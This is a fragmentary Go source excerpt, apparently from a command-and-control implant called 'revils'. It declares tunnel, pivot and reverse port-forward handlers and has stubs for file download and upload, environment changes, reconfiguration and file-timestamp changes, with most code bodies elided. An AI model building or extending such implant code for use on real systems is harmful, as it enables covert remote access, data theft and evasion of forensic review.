...
import (
	...
	"github.com/Kevin-kitnick/revils/implant/revils/handlers/matcher"
...
type TunnelHandler func(*revilspb.Envelope, *transports.Connection)

// PivotHandler - Handler related to pivoting
type PivotHandler func(*revilspb.Envelope, *transports.Connection)

// RportFwdHandler - Handler related to reverse port forwarding
type RportFwdHandler func(*revilspb.Envelope, *transports.Connection)
...
func downloadHandler(data []byte, resp RPCResponse) {
	...
	*/
	...
	var download *revilspb.Download

	downloadReq := &revilspb.DownloadReq{}
	...
	if err != nil {
		...
		download = &revilspb.Download{Path: target, Exists: false, ReadFiles: int32(readFiles), UnreadableFiles: int32(unreadableFiles)}
...
func uploadHandler(data []byte, resp RPCResponse) {
	...
	// Process Upload
	upload := &revilspb.Upload{Path: uploadPath}
...
func unsetEnvHandler(data []byte, resp RPCResponse) {
	...
	unsetEnvResp := &revilspb.UnsetEnv{
		Response: &commonpb.Response{},
	}
	if err != nil {
...
func reconfigureHandler(data []byte, resp RPCResponse) {
	reconfigReq := &revilspb.ReconfigureReq{}
	...
	reconfigResp := &revilspb.Reconfigure{}
...
func chtimesHandler(data []byte, resp RPCResponse) {
	chtimesReq := &revilspb.ChtimesReq{}
